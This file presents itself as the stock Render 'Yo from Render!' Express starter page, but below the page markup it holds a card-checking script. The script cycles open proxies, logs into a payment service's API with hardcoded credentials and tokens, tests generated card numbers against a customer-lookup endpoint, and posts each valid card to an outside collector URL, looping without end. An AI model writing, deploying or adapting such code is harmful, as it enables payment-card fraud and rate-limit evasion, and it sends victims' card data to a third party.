const express = require("express");
const app = express();
const port = process.env.PORT || 3001;

app.get("/", (req, res) => res.type('html').send(html));

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
var i = 0;
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Yo from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Yo from Render!
    </section>
  </body>
</html>
`
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');
var proxies = [ "164.92.73.145:3128", "135.148.95.28:3128", "190.110.208.229:999"]
//var proxies = [    "154.79.242.178:1686",    "98.148.96.228:8111",    "81.143.236.200:443"]

var cookie = require('cookie');


  var num = "0118883434";
const fetch = require('node-fetch');
login = { userIdentifier: num,password:num,fireBaseToken:"diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO"};

  function fish(){
var card = "6391730"+rand(9);
card = "6391871200106647";
//Math.random().toString().slice(2,11);
var random = Math.floor(Math.random()*proxies.length);
    var proxy = proxies[random];
var Agent = new HttpsProxyAgent('http://'+proxy);
fetch('https://syberapp.sybertechnology.com/api/login',{
  method: 'POST',
  body:JSON.stringify(login),
  headers: {
    'content-type': 'application/json',
    'Authorization':'xwrsy67Un9oshl8H=c5g',
    'Version':'100',
    'User-Agent':'okhttp/4.9.1',
  },
  agent: Agent
}).then((response) =>{ 
  
  var status = response.status;
  if(status == 200){
    
var token = response.headers.get('set-cookie');
cookies = cookie.parse(token);
      var re = cookies["HttpOnly, remember-me-posc"];
var id = gen(8)+"-"+gen(4)+"-"+gen(4)+"-"+gen(4)+"-"+gen(12);
fetch('https://syberapp.sybertechnology.com/customerInfo',{
  method: 'POST',
  body:JSON.stringify(
    {"transactionId":id,"serviceId":"000009001016","pan":card,"lat":"0.0","lng":"0.0","authType":"10"}
    ),
  headers: {
    // 'application/json' is the modern content-type for JSON, but some
    // older servers may use 'text/json'.
    // See: http://bit.ly/text-json
    'content-type': 'application/json',
    'Authorization':'xwrsy67Un9oshl8H=c5g',
    'Version':'100',
    'User-Agent':'okhttp/4.9.1',
   'Cookie':"remember-me-posc="+re
  },
  agent: Agent
}).then(response=>response.json()).then(data=>{
  if(data.errorCode){
    //console.log("Error "+card + " "+data.errorCode);
    fish();
  }else if(data.responseStatus){
    console.log("Success "+ card)
 fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
    method: 'POST',

    headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'okhttp/4.9.1',
        'Version': '100',
        'Accept-Encoding': 'gzip',
      
    },
    body: JSON.stringify(
{"id":card}
)
})
fish()
  }
}).catch((error)=>{
  if(error.code == 'ECONNREFUSED'){
  console.log("Proxy Refused V2 "+proxy)
fish()
  }
})

  }else if(status == 403){
console.log("Forbidden "+proxy)
fish()
}else if(status == 500){
//console.log("System Error 500 : " + proxy )
fish()
}else if(status == 503){
//console.log("System Error 500 : " + proxy )
fish()
}else if(status == 400){
//console.log("System Error 500 : " + proxy )
fish()
}else if(status == 404){
//console.log("System Error 500 : " + proxy )
fish()
}else{
console.log("Account Locked "+status+" "+proxy)
fish()
}
}).catch((error)=>{
  if(error.code == 'ECONNREFUSED'){
  console.log("Proxy Refused " +proxy)
fish()
  }
})


}
fish();
function gen(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function rand(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
